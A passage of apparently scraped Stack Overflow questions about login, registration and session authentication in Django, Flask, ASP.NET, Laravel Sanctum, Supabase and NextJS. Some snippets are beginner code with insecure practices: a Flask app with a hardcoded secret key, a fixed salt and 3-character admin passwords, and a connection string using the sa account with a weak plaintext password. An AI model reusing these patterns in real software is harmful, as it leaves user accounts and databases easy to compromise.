</li>
<li><p>Use Web connector --&gt; Advanced --&gt; In the headers, create &quot;ApiKeyName&quot; and provided the key.</p>
</li>
</ol>
<p>None of the above worked, while all the forums that i read through provided almost similar answers.</p>
<p>Am I doing something wrong here? or is there a different way of doing this? Appreciate if someone can throw some light. TIA.</p>
<p>My URL(test) looks like this : <strong><a href=""https://api.testing.com/v3/external/reporting/sharing?endDate=2019-03-12&amp;startDate=2019-03-02&amp;metric=blend_sharing%67"" rel=""nofollow noreferrer"">https://api.testing.com/v3/external/reporting/sharing?endDate=2019-03-12&amp;startDate=2019-03-02&amp;metric=blend_sharing%67</a></strong></p>
"
"<p>I've developed registration functionality for my web application using a combination of form elements, a view, a registration template, and JavaScript modals. However, despite completing the registration process, the user data is not being saved to the database as expected.</p>
<p>Details:</p>
<p>Form: I have implemented a form for user registration.
View: A corresponding view function handles the registration process.
Template: I've created a registration template for rendering the registration form.
JavaScript Modals: Modal dialogs are used for user interaction during the registration process.</p>
<p>Problem Statement:
When I submit the registration form, the user data does not get stored in the database. I've verified that the form submission is successful, but somehow the data isn't persisting.</p>
<p>Expectation:
Upon successful submission of the registration form, the user data should be saved to the database for future reference and authentication purposes.</p>
<p>Request for Assistance:
I'm seeking guidance on what could be causing this issue and how to troubleshoot it effectively. Any insights, suggestions, or potential solutions would be greatly appreciated. Thank you!</p>
<p>My code:</p>
<p>Base code, containing JavaScript modals:</p>
<pre><code>{% load static %}

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Document&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;{% static 'styles.css' %}&quot;&gt;
    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN&quot; crossorigin=&quot;anonymous&quot;&gt;
    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;

    &lt;!-- JavaScript for modals --&gt;
    &lt;script&gt;
        // Function to show login modal
        // Function to show login modal
        function showLoginModal() {
            document.getElementById('login-modal').style.display = 'block';
            document.getElementById('logout-modal').style.display = 'none';  // Hide logout modal
            document.getElementById('main-content').style.filter = 'blur(5px)';
        }

        // Function to show logout modal
        function showLogoutModal() {
            document.getElementById('logout-modal').style.display = 'block';
            document.getElementById('login-modal').style.display = 'none';  // Hide logout modal
            document.getElementById('main-content').style.filter = 'blur(5px)';
        }

        // Function to show register modal
        function showRegisterModal() {
            document.getElementById('register-modal').style.display = 'block';
            document.getElementById('main-content').style.filter = 'blur(5px)';
        }

        // Function to hide modals
        function hideModals() {
            document.getElementById('login-modal').style.display = 'none';
            document.getElementById('register-modal').style.display = 'none';
            document.getElementById('logout-modal').style.display = 'none';
            document.getElementById('main-content').style.filter = 'none'; // Remove blur
        }

        // Close modals when clicking outside of them
        window.onclick = function(event) {
            var loginModal = document.getElementById('login-modal');
            var logoutModal = document.getElementById('logout-modal');
            var registerModal = document.getElementById('register-modal');
            if (event.target == loginModal || event.target == registerModal || event.target == logoutModal) {
                hideModals();
            }
        }
    &lt;/script&gt;

    &lt;style&gt;
        .navbar-custom {
            height: 50px;
        }

        /* Style for main content (to blur when modal is shown) */
        #main-content {
            transition: filter 0.3s; /* Smooth transition for blur effect */
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;!-- Navbar --&gt;
&lt;nav class=&quot;main-top-navbar navbar navbar-dark bg-dark fixed-top navbar-custom&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;a href=&quot;#&quot; class=&quot;navbar-brand&quot;&gt;Your Logo&lt;/a&gt;
        
        &lt;div class=&quot;main-top-navbar-elements navbar-text ml-auto&quot;&gt;
            &lt;a href=&quot;#&quot; class=&quot;font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;System |&lt;/a&gt;
            &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;Cards |&lt;/a&gt;
            &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;Temples |&lt;/a&gt;
            &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;Blog |&lt;/a&gt;
            &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;Shop |&lt;/a&gt;
            &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot;&gt;Membership |&lt;/a&gt;
            {% if not user.is_authenticated %}
                &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot; onclick=&quot;showLoginModal()&quot;&gt;Login |&lt;/a&gt;
                &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot; onclick=&quot;showRegisterModal()&quot;&gt;Register |&lt;/a&gt;
            {% else %}
                &lt;a href=&quot;#&quot; class=&quot;text-light font-weight-bold&quot; style=&quot;margin-right: 30px;&quot; onclick=&quot;showLogoutModal()&quot;&gt;Logout |&lt;/a&gt;
            {% endif %}
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/nav&gt;

&lt;!-- Main content of your website --&gt;
&lt;div id=&quot;main-content&quot;&gt;
    &lt;!-- Your website content here --&gt;
    {% block body %}
    
    {% endblock %}
&lt;/div&gt;

&lt;!-- Login Modal --&gt;
&lt;div id=&quot;login-modal&quot; class=&quot;modal&quot;&gt;
    &lt;div class=&quot;modal-content&quot;&gt;
        &lt;!-- Include your login form here --&gt;
        {% include 'registration/login.html' %}
    &lt;/div&gt;
&lt;/div&gt;

&lt;!-- Logout Modal --&gt;
&lt;div id=&quot;logout-modal&quot; class=&quot;modal&quot;&gt;
    &lt;div class=&quot;modal-content&quot;&gt;
        &lt;!-- Include your login form here --&gt;
        {% include 'registration/logout.html' %}
    &lt;/div&gt;
&lt;/div&gt;


&lt;!-- Register Modal --&gt;
&lt;div id=&quot;register-modal&quot; class=&quot;modal&quot;&gt;
    &lt;div class=&quot;modal-content&quot;&gt;
        &lt;!-- Include your register form here --&gt;
        {% include 'registration/register.html' %}
    &lt;/div&gt;
&lt;/div&gt;

&lt;!-- Footer --&gt;
&lt;nav class=&quot;navbar navbar-dark bg-dark fixed-bottom&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;span class=&quot;navbar-text text-light font-weight-bold mx-auto&quot;&gt;
            Follow the truth!
        &lt;/span&gt;
    &lt;/div&gt;
&lt;/nav&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Forms code, containing registration form:</p>
<pre><code>from django import forms
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.models import User

class UserRegistrationForm(UserCreationForm):

    class Meta:
        model = User
        fields = ['username', 'email', 'password1', 'password2']
</code></pre>
<p>View code, containing registration view</p>
<pre><code>def register_view(request):

    if request.method == 'POST':
        form = UserRegistrationForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect(&quot;index&quot;)  
    else:
        form = UserRegistrationForm()

    print(form.errors)

    context = {'register_form': form}
    return render(request, 'registration/register.html', context)
</code></pre>
<p>Template code, containing the register.html template.</p>
<pre><code>&lt;form class=&quot;form&quot; method=&quot;POST&quot;&gt;
    {% csrf_token %}
    &lt;label class=&quot;label&quot; for=&quot;email&quot;&gt;Email:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;text&quot; id=&quot;email&quot; name=&quot;email&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;username&quot;&gt;Username:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;password&quot;&gt;Password:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot;&gt;
    &lt;label class=&quot;label&quot; for=&quot;confirm_password&quot;&gt;Confirm Password:&lt;/label&gt;
    &lt;input class=&quot;input&quot; type=&quot;password&quot; id=&quot;confirm_password&quot; name=&quot;password2&quot;&gt;
    &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Register&lt;/button&gt;
&lt;/form&gt;
</code></pre>
"
"<p>I'm using <code>dotnet add package supabase-csharp</code> as a c# client.
I'm signed in <code> var session = await supabase.Auth.SignIn(email, password);</code> successfully, but when i tried to get the current user or session it get back as null:</p>
<pre><code>var currentSession = _supabase.Auth.CurrentSession;
var currentUser = _supabase.Auth.CurrentUser;
</code></pre>
<p>The configuration:</p>
<pre><code>builder.Services.AddScoped&lt;Supabase.Client&gt;(_ =&gt;

new Supabase.Client(
    builder.Configuration[&quot;SUPABASE_URL&quot;],
    builder.Configuration[&quot;SUPABASE_KEY&quot;],
    new SupabaseOptions
    {
        AutoRefreshToken = true,
        AutoConnectRealtime = true,
    }));
</code></pre>
<p>Any hints related to this?</p>
"
"<p>Both the SQL Server 2019 Standard edition and the IIS v10 are on the same server, and SQL Server is configured for Windows and SQL Server authentication.</p>
<p>Other applications successfully connect to this SQL Server with Windows AD accounts.</p>
<p>Web API uses this connection string configured in its JSON file:</p>
<pre><code>Server=(local);Database=myDataBase;Trusted_Connection=True;
</code></pre>
<p>When calling the Web API, it fails, and the following log entry can be seen in the SQL Server log.</p>
<blockquote>
<p>Message:<br />
Login failed for user 'Domain\ServerName$'. Reason: Could not find a login matching the name provided. [CLIENT: ]</p>
</blockquote>
<p>If the standard SQL Server login is used, Web API call work.</p>
<pre><code>Server=(local);Database=myDataBase;User Id=sa;Password=sa@123;
</code></pre>
<p>Can someone help me to setup this with Windows authentication?</p>
"
"<p>im trying to create my own costume view for the login page and im getting the following error.</p>
<p>this is my views:</p>
<pre><code>    def my_view(request):
username = request.POST.get('username')
password = request.POST.get('password')
user = authenticate(request, username=username, password=password)
login(request, user)
return reverse_lazy('HomeView')
</code></pre>
<p>this is the urls:</p>
<pre><code>urlpatterns = [
path('', HomeView.as_view(), name='HomeView'),
path('show_todo_list/&lt;int:pk&gt;', ShowToDoView.as_view(), name='Show_To_Do_list'),
path('create_task/', CreateTaskView.as_view(), name='Create_Task'),
path('change_task/&lt;int:pk&gt;', ChangeTaskView.as_view(), name= 'Change_Task'),
path('delete_task/&lt;int:pk&gt;', DeleteTaskView.as_view(), name= 'Delete_Task'),
path('login/', my_view, name='login')
</code></pre>
<p>]</p>
<p>and the error is in line 34: login(request, user)
AttributeError: 'AnonymousUser' object has no attribute '_meta'</p>
"
"<p>I can't register it move me to login page.
When I want to login it tells me login failed.
Any ideas?</p>
<p>Not sure where is the problem.
I think I am already tried everything.
I ve checked and there is no typo.</p>
<pre><code>from sqlite3.dbapi2 import SQLITE_TRANSACTION
from flask import Flask, render_template, flash, g, url_for, redirect, session, request
from datetime import datetime


import sqlite3
import random
import string
import hashlib
import binascii

app = Flask(__name__)

app.config['SECRET_KEY'] = 'SecretKey'

app_info = {

    'db_file': 'C:/Users/Robo/Desktop/RatRace/data/users1.db'}


def get_db():

    if not hasattr(g, 'sqlite_db'):
        conn = sqlite3.connect(app_info['db_file'])
        conn.row_factory = sqlite3.Row
        g.sqlite_db = conn
    return g.sqlite_db


@app.teardown_appcontext
def close_db(error):

    if hasattr(g, 'sqlite3_db'):
        g.sqlite_db.close()


class User:

    def __init__(self, user='', password=''):
        self.user = user
        self.password = password

    def hash_password(self):
        os_urandom_static = b&quot;\xb9\xed\xbev\x02v\xb1 K\x01\xf8\xb3\x04\x0b|\x975\x96\xef7\xbd\xd3\x18\xdb\xe2\x05J\xd4\x7f:\xa8\xaa\xadJ\xe8\x1bn\xea\xba\x96b\xa2\xb3\x96@\x7fJ\xdcaDgR\xe4j7\n\x82X\r\xdc&quot;
        salt = hashlib.sha256(os_urandom_static).hexdigest().encode('ascii')
        pwdhash = hashlib.pbkdf2_hmac(
            'sha512', self.password.encode('utf-8'), salt, 100000)
        pwdhash = binascii.hexlify(pwdhash)
        return (salt + pwdhash).decode('ascii')

    def verify_password(self, stored_password, provided_password):
        salt = stored_password[:64]
        stored_password = stored_password[64:]
        pwdhash = hashlib.pbkdf2_hmac('sha512', provided_password.encode(
            'utf-8'), salt.encode('ascii'), 100000)
        pwdhash = binascii.hexlify(pwdhash).decode('ascii')
        return pwdhash == stored_password

    def check_password(self, stored_password, provided_password):
        salt = stored_password[:64]
        stored_password = stored_password[64:]
        pwdhash = hashlib.pbkdf2_hmac('sha512', provided_password.encode(
            'utf-8'), salt.encode('ascii'), 100000)
        pwdhash = binascii.hexlify(pwdhash).decode('ascii')
        return pwdhash == stored_password

    def get_random_user_password(self):
        random_user = ''.join(random.choice(string.ascii_lowercase)
                              for i in range(3))
        self.user = random_user

        password_characters = string.ascii_letters
        random_password = ''.join(random.choice(
            password_characters)for i in range(3))
        self.password = random_password

    def login_user(self):

        db = get_db()
        sql_statement = 'select id, name, email, password, is_active, is_admin from users where name=?'
        cur = db.execute(sql_statement, [self.user])
        user_record = cur.fetchone()

        if user_record != None and self.verify_password(user_record['password'], self.password):
            return user_record
        else:
            self.user = None
            self.password = None
            return None


@app.route('/init_app')
def init_app():
    db = get_db()
    sql_statement = 'select count(*) as cnt from users where is_active and is_admin;'
    cur = db.execute(sql_statement)
    active_admins = cur.fetchone()

    if active_admins != None and active_admins['cnt'] &gt; 0:
        flash('Application is already setup')
        return redirect(url_for('index'))

    user_pass = User()
    user_pass.get_random_user_password()
    sql_statement = ''' insert into users(name, email, password, is_active, is_admin) values(?,?,?,True, True);'''
    db.execute(sql_statement, [user_pass.user,
               'robo@cool.pl', user_pass.hash_password()])
    db.commit()
    flash('user {} with password {} has been created'.format(
        user_pass.user, user_pass.password))
    return redirect(url_for('index'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html', active_menu='login')
    else:
        user_name = '' if 'user_name' not in request.form else request.form['user_name']
        user_pass = '' if 'user_pass' not in request.form else request.form['user_pass']

        login = User(user_name, user_pass)
        login_record = login.login_user()

        if login_record != None:
            session['user'] = user_name
            flash('Login succesfull, welcome{}'.format(user_name))
            return redirect(url_for('index'))
        else:
            flash('Login failed, try again')
            return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():

    if not 'user' in session:
        return redirect(url_for('login'))
    login = session['user']

    db = get_db()
    message = None
    user = {}

    if request.method == 'GET':
        return render_template('register.html', active_menu='users', user=user)
    else:
        user['user_name'] = '' if not 'user_name' in request.form else request.form['user_name']
        user['email'] = '' if not 'email' in request.form else request.form['email']
        user['user_pass'] = '' if not 'user_pass' in request.form else request.form['user_pass']

        cursor = db.execute(
            'select count(*) as cnt from users where name = ?', [user['user_name']])
        record = cursor.fetchone()
        is_user_name_unique = (record['cnt'] == 0)

        cursor = db.execute(
            'select count(*) as cnt from users where email = ?', [user['email']])
        record = cursor.fetchone()
        is_user_email_unique = (record['cnt'] == 0)



        if not message:
            user_pass = User(user['user_name'], user['user_pass'])
            password_hash = user_pass.hash_password()
            sql_statement = '''insert into users(name, email, password, is_active, is_admin) values(?,?,?, True, False);'''
            db.execute(sql_statement, [
                       user['user_name'], user['email'], password_hash])
            db.commit()
            flash('User {} created'.format(user['user_name']))
            return redirect(url_for('users'))
        else:
            flash('Error {}'.format(message))
            return render_template('register.html', active_menu='users', user=user)

</code></pre>
<p>When I am tying to log in it tells me te login is failed.
When I want to register it redirest me to login page.
What I am doing wrong?</p>
"
"<p>Here is my challenge</p>
<p>I have implemented a Single Page Application using React and Laravel Sanctum for API authentication which works perfectly to the requirements and flow desired However, my admin dashboard is in normal blade views and livewires</p>
<p>I am using OTP verification and not email / password combination to authenticate the user and returns the <code>auth()-&gt;user()createToken(config('app.name') . ' Personal Access Client')-&gt;plainTextToken</code> that works magnificently to function with the <code>auth:sanctum</code> API routes</p>
<p>Unfortunately, the admin Dashboard uses the normal auth middleware to access the blade view pages. In this case, if I try accessing <code>/admin</code> I am redirected back and upon debugging, I noticed <code>auth()-&gt;user()</code> is null</p>
<p>How can I use the middleware <code>auth</code> while still retaining the catch-all route structure in the web.php because I know the <code>auth()-&gt;user()</code> is null because middleware <code>auth</code> is not captured</p>
<p>I really don't want to use the option of converting the SPA into blade views just because I did not find a solution to the <code>auth</code> problem</p>
<p>Here is <code>web.php</code></p>
<p>Route::get('{any}', static function () { return view('home.index'); })-&gt;where('any', '^(?!api|admin|horizon|telescope).*?');</p>
<p>Route::get('/admin', [DashboardController::class, 'index'])-&gt;middleware(['auth', 'role:admin'])-&gt;name('dashboard');</p>
<p>Here is <code>home.index</code> -&gt; home/index.blade.php blade view that holds the Single Page Application</p>
<pre><code>&lt;!-- CSRF Token --&gt;
&lt;meta name=&quot;csrf-token&quot; content=&quot;{{ csrf_token() }}&quot;&gt;

&lt;meta name=&quot;user-id&quot; content=&quot;@if (auth()-&gt;check()) {{ auth()-&gt;user()-&gt;uid }} @else null @endif&quot; /&gt;

&lt;title&gt;{{ config('app.name', 'Laravel') }} | @yield('title')&lt;/title&gt;

&lt;!-- Include SweetAlert CSS and JS --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/sweetalert2@11.1.9/dist/sweetalert2.min.css&quot;&gt;
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/sweetalert2@11.1.9/dist/sweetalert2.all.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- Scripts --&gt;
@viteReactRefresh
@vite(['resources/sass/app.scss', 'resources/js/app.js'])

@laravelPWA

&lt;/head&gt;

&lt;body&gt;
    &lt;div id=&quot;app&quot;&gt;
        @yield('content')
    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<p>And here is the LoginVerifyModal.jsx component</p>
<pre><code>import React, { createRef, useState } from 'react';

import axiosClient from &quot;../../route/axios-client&quot;;
import { useForm } from &quot;../../control/hooks/useForm&quot;;
import { useStateContext } from &quot;../../control/context/ContextProvider&quot;;

import ClipLoader from 'react-spinners/ClipLoader';

const LoginVerifyModal = ({ isOpen, onClose, phoneNumber }) =&gt; {
    const { notification, setUser, setToken, setNotification } = useStateContext()
    const { errors, setErrors, renderFieldError, message, setMessage, navigate } = useForm()
    const [ waitResponse, setWaitResponse ] = useState(false)

    const codeRef = createRef()

    const onSubmit = async (event) =&gt; {
        event.preventDefault()

        setErrors(null);
        setMessage('');

        const code = codeRef.current.value.trim();

        // Validate the code as a 6-digit number
        const codePattern = /^\d{6}$/;
        if (!codePattern.test(code)) {
            Swal.fire({
                title: 'Warning!',
                text: 'Verification code must be a 6-digit number',
                icon: 'warning',
            });
            return;
        }

        const payload = {
            code: code,
        }

        setWaitResponse(true)
        await axiosClient.post('/verify', payload)
            .then(({data}) =&gt; {
                setUser(data.data.user)
                setToken(data.data.token)
                setNotification(`Welcome ${data.data.user.name}`)

                setWaitResponse(false)

                onClose(); // Close the modal after confirming

                // After successful OTP verification and state update
                window.location.reload();
            })
            .catch(({response}) =&gt; {
                if (response.data.message) {
                    setMessage(response.data.message)
                }
                if (response.data.errors) {
                    setErrors(response.data.errors)
                }
                setWaitResponse(false)
            })
    }

    if (!isOpen) {
        return null;
    }

    return (
        &lt;div id=&quot;loginModal&quot; className={`modal ${isOpen ? 'open' : ''}`}&gt;
            &lt;div className=&quot;modal-content&quot;&gt;
                &lt;h2 className=&quot;header-login&quot;&gt;
                    Verify Login
                &lt;/h2&gt;

                &lt;form onSubmit={onSubmit}&gt;

                    {waitResponse ? (
                        &lt;div className=&quot;d-flex justify-content-center&quot;&gt;
                            &lt;ClipLoader color={'#0d6efd'} loading={waitResponse} size={150} /&gt;
                        &lt;/div&gt;
                    ) : (
                        &lt;&gt;
                            &lt;div className=&quot;mb-3&quot;&gt;
                                &lt;label htmlFor=&quot;code&quot; className=&quot;form-label&quot;&gt;Verification Code&lt;/label&gt;
                                &lt;input ref={codeRef}
                                        type=&quot;text&quot;
                                        className={`form-control ${errors &amp;&amp; errors.hasOwnProperty('code') ? 'is-invalid' : ''}`}
                                        placeholder=&quot;Code sent&quot;
                                        id=&quot;code&quot;
                                        aria-describedby=&quot;code&quot;/&gt;
                                { renderFieldError('code') &amp;&amp;
                                    &lt;span className=&quot;invalid-feedback&quot; role=&quot;alert&quot;&gt;
                                        &lt;strong&gt;{renderFieldError('code')}&lt;/strong&gt;
                                    &lt;/span&gt;
                                }
                            &lt;/div&gt;
                        &lt;/&gt;
                    )}

                    &lt;div className=&quot;btn-continue-and-cancel&quot;&gt;
                        &lt;button id=&quot;cancelLogin&quot; onClick={onClose}&gt;Cancel&lt;/button&gt;
                        &lt;button id=&quot;confirmLogin&quot; type=&quot;submit&quot; disabled={!!waitResponse}&gt;Verify&lt;/button&gt;
                    &lt;/div&gt;

                &lt;/form&gt;

            &lt;/div&gt;
        &lt;/div&gt;
    );
};

export default LoginVerifyModal;
</code></pre>
<p>For clarity and context, I shared these snippets to emphasize that even when reloading the page after OTP success, the meta value user-id is still null, meaning the user is still invalidated since I am not accessing a route with auth middleware</p>
<p>NOTE: the catch-all route does not hold any middleware</p>
"
"<p>I am trying to load a json (newline delimited) file stored on a private GCS bucket using <a href=""https://ibis-project.org/"" rel=""nofollow noreferrer"">ibis</a>. I get the following error:</p>
<p><code>Invalid Input Error: Malformed JSON in file &quot;&lt;&lt;&lt;URL&gt;&gt;&gt;&quot;, at byte 1 in record/value 2: unexpected character. </code></p>
<p>However, after setting the file access to public I have no issues loading the data.</p>
<p>Makes me think GCS applies some kind of compression/encryption to private GCS files.</p>
<p>**Any idea how to get this issue solved is much appreciated!
**
Note that:
The url for private files starts with <code>https://storage.cloud.google.com</code>
The url for public files starts with <code>https://storage.googleapis.com</code></p>
<p>Tried uploading the file with different file formats (.txt, .jsonl, .json) but no effect.</p>
<p>Also tried mingling the file type (application/json, text/plain) etc. No effect either.</p>
<p>The one thing I found to have effect is the access setting...</p>
"
"<p>I am changing an API to use windows Authentication with (NegotiateDefaults.AuthenticationSheme).AddNegotiatie()</p>
<p>I created a custom policy so that the user allowed to use the API will change depending on the environment.</p>
<pre><code>builder.Services
       .AddAuthorization(options =&gt;
       {
           options.FallbackPolicy = options.DefaultPolicy;
           options.AddPolicy(&quot;ConfigRole&quot;, policy =&gt;
                policy.Requirements.Add(new ConfigRoleRequirement(builder.Configuration.GetSection(&quot;ConfigIISRole&quot;).Value)));
                
       });
</code></pre>
<p>Here is the requirement.</p>
<pre><code>    public class ConfigRoleRequirement : IAuthorizationRequirement
    {
        public ConfigRoleRequirement(string configValue)
        {
            AuthenticatedIISUser = configValue;
        }

        public string AuthenticatedIISUser { get; }
    }
</code></pre>
<p>Here is the requirement handler</p>
<pre><code>    public class ConfigRoleRequirementHandler : AuthorizationHandler&lt;ConfigRoleRequirement&gt;
    {
        protected override Task HandleRequirementAsync(
            AuthorizationHandlerContext context, ConfigRoleRequirement requirement)
        {
            var userNameClaim = context.User.Identity.Name;

            if(userNameClaim == null)
            {
                return Task.CompletedTask;
            }

            if (userNameClaim == requirement.AuthenticatedIISUser)
            {
                context.Succeed(requirement);
            }

            return Task.CompletedTask;
        }
    }
</code></pre>
<p>This is where userNameClaim is null. The interesting thing is that if I don't use the custom policy but just annotate my endpoint with (Roles = &quot;DOMAIN\USER&quot;) it authenticates as expected. What is the difference between how the Roles argument to the Authorize annotation handles authentication and what I am doing?</p>
<p>Here is the controller annotation</p>
<pre><code>        [HttpGet(&quot;{arg}&quot;)]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [Authorize(Policy = &quot;ConfigRole&quot;)]
        public async Task&lt;ActionResult&lt;List&lt;ValidateArg&gt;&gt;&gt; ValidateArg(string arg)
        {
           var containers = await ValidateArg(arg);
           return Ok(containers);
        }
</code></pre>
<p>I have read any article or question on stackoverflow that I could find and though they seem related at first glance, the answers never seem to apply to what my code is doing specifically.</p>
"
"<p>I'm new to sessions/cookies for auth so I'm getting to know about everything slowly.</p>
<p>I have a Web API that has some endpoints to login and also a protected endpoint that can only be accessed once the cookie is issued and not expired.</p>
<p>Just for testing purposes of how it would be handled in the frontend, I created a simple form which calls these endpoints.</p>
<p>The login endpoint works and I do get a cookie that I configured in my backend, but for the other protected endpoint I get a <strong>302 Found</strong> error (I have a button that calls this protected endpoint after I'm logged in), even though this works when I use postman. ie, I can access the protected endpoint. This redirects me to a different endpoint which I don't have set up (I'm guessing its a endpoint set by .NET?)</p>
<p>Login endpoint:</p>
<p><a href=""https://i.stack.imgur.com/j0jMG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/j0jMG.png"" alt=""enter image description here"" /></a></p>
<p>Authorized endpoint when calling it directly after login:</p>
<p><a href=""https://i.stack.imgur.com/6t54M.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6t54M.png"" alt=""auth"" /></a></p>
<p>Another thing is that this cookie that the backend issues gets deleted after my page is reloaded/refreshed and I don't know why.</p>
<p>I would also appreciate any guidance on how to effectively handle session authentication on both front and backend securely.</p>
<p>Here's my code:</p>
<p>Authentication config - I set it to a low expiration time for testing</p>
<pre class=""lang-cs prettyprint-override""><code>public static IServiceCollection AddApplicationCookieAuth(this IServiceCollection services) 
{
    services.AddAuthentication(options =&gt; {
            options.DefaultAuthenticateScheme = CookieAuthenticationDefaults.AuthenticationScheme;
            options.DefaultSignInScheme = CookieAuthenticationDefaults.AuthenticationScheme;
            options.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;
        }).AddCookie(options =&gt; {
            options.Cookie = new() {
                Name = &quot;MySessionAuthCookie&quot;,
                HttpOnly = true
            };
            options.ExpireTimeSpan = TimeSpan.FromSeconds(30);
            options.SlidingExpiration = true;
        });

    return services;
}
</code></pre>
<p>Controller endpoints:</p>
<pre><code>// Protected endpoint
[HttpGet]
[Authorize]
public IActionResult GetProtectedData() 
{
    return Ok(&quot;Protected data&quot;);
}

[HttpPost(&quot;login&quot;)]
public async Task&lt;IActionResult&gt; Login(LoginRequest request) 
{
    var user = await _userManager.FindByNameAsync(request.Email);

    if (user != null &amp;&amp; await _userManager.CheckPasswordAsync(user, request.Password))
    {
        var claims = new List&lt;Claim&gt;
        {
            new Claim(ClaimTypes.Email, user.Email),
            new Claim(ClaimTypes.Role, &quot;Admin&quot;)
        };

        var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
        
        var authProperties = new AuthenticationProperties { IsPersistent = true };

        await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity), authProperties);

        return Ok(&quot;Login success&quot;);
    }

    return Unauthorized();
}
</code></pre>
<p>My frontend is just regular HTML and JS for demo purposes.</p>
<pre class=""lang-js prettyprint-override""><code>async function protectedEndpoint() {
    try {
        const res = await axios.get(&quot;https://localhost:7009/api/auth&quot;, {withCredentials: true, });
        console.log('Response:', res);

    } catch(err) {
        console.error('Error:', err);
    }
}

async function authenticate(data) {
    try {
        const res = await axios.post(&quot;https://localhost:7009/api/auth/login&quot;, data, {withCredentials: true});
        console.log('Response:', res);
    } catch(err) {
        console.error('Error:', err);
    }
}
</code></pre>
"
"<p>I am using NextJS 14 with App router with Spring Boot in the backend. I have public and private routes. For the private routes I have a login page. When the user logs in successfully I return a JWT token as a cookie.</p>
<p>This is my root layout</p>
<pre><code>import &quot;./global.css&quot;;
import Header from &quot;./components/header/header&quot;;
import {GlobalProvider} from &quot;./_lib/global-provider&quot;; 
import MainContent from &quot;./components/main-content&quot;;

export default async function RootLayout({children}) {

    return (
            &lt;html lang=&quot;en&quot; className=&quot;&quot;&gt;
            &lt;body className=&quot;min-h-screen scroll-smooth&quot;&gt;
            &lt;div className=&quot;flex flex-col min-h-screen&quot;&gt;
                &lt;GlobalProvider&gt;
                    &lt;Header/&gt;
                    &lt;MainContent&gt;
                        {children}
                    &lt;/MainContent&gt;
                &lt;/GlobalProvider&gt;
            &lt;/div&gt;
            &lt;/body&gt;
            &lt;GoogleAnalytics/&gt;
            &lt;/html&gt;
    );
}
</code></pre>
<p>And this is my Header component that should show a Log Out button when the user is logged in.</p>
<pre><code>&quot;use client&quot;;

import Link from &quot;next/link&quot;;
import {useAdminAuthContext} from &quot;../../_lib/admin-auth-provider&quot;;
import LogoHeader from &quot;./logo-header&quot;;

export default function Header() {

    const adminAuth = useAdminAuthContext();

    return (
            &lt;header className=&quot;sticky top-0 z-50 flex-none bg-gray-50 py-6 drop-shadow&quot;&gt;
                &lt;nav className=&quot;relative mx-auto flex justify-between px-8 max-sm:px-2&quot;&gt;
                    &lt;div className=&quot;flex items-center &quot;&gt;
                        &lt;LogoHeader/&gt;
                    &lt;/div&gt;

                    &lt;div className=&quot;flex items-center&quot;&gt;
                        {
                            adminAuth.user != null &amp;&amp; &lt;button&gt;LOG OUT&lt;/button&gt;
                        }
                    &lt;/div&gt;
                &lt;/nav&gt;
            &lt;/header&gt;
    );
}
</code></pre>
<p>I am using an AuthContext that exposes logIn and logOut functions that actually calls my backend and saves into a state prop if the user is authenticated.</p>
